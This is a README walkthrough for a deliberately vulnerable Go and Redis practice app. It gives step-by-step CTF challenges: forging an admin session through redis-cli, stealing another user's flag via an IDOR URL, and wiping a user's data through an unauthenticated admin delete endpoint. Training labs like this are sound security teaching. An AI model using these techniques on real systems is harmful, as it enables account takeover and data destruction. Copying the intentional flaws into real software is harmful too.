# RedFlag Walkthrough

RedFlag is a damn vulnerable Redis-backed web app designed for learning session management, privilege escalation, and CTF-style web attacks.

---

## Setup

1. Start Redis:
   ```
   redis-server
   ```

2. Run the app:
   ```
   go run main.go
   ```

3. Visit [http://localhost:8080](http://localhost:8080)

---

## Challenge 1: Session Hijack

### Goal:
Gain admin access and steal a flag using Redis CLI.

### Steps:
1. Login as any user (e.g. `robbie`)
2. In a second terminal, run:
   ```bash
   redis-cli
   SET session:robbie '{"user":"robbie","role":"admin"}'
   ```
3. Reload `/flag?user=robbie`
4. You’ll see the flag: `REDFLAG{y0u_r3d1s_wr4ngler}`

---

## Challenge 2: IDOR Flag Theft

### Goal:
Steal another user’s flag without logging in.

### Steps:
1. In Redis:
   ```bash
   SET flag:admin "REDFLAG{th3_m0th3r_fl4g}"
   ```
2. Visit:
   ```
   http://localhost:8080/flag-alt?user=admin
   ```
3. You’ve just exploited an IDOR.

---

## 💣 Challenge 3: Admin Route Abuse

### Goal:
Use the unauthenticated delete endpoint to wipe another user's session and flag.

### Steps:
1. Login or create a user `alice`
2. In Redis:
   ```bash
   SET flag:alice "REDFLAG{d3l3t3d_fr0m_m3m0ry}"
   ```
3. Visit:
   ```
   http://localhost:8080/admin/delete?user=alice
   ```
4. Try to access `/flag-alt?user=alice` — it should fail.

---

## Bonus Challenges

- Add TTL to flags and race to retrieve them
- Track stolen flags in Redis using `LPUSH logs`
- Add a `leaderboard` using `SADD winners <user>`

---

## Future Plans

- Secure flag route with real token/session auth
- Add user login with password hashes in Redis
- Docker + reset script for repeatable practice

---

## Credits

Made with 💀 and ☕ by 404Yeti  
Inspired by DVWA, Juice Shop, and GoHackers everywhere.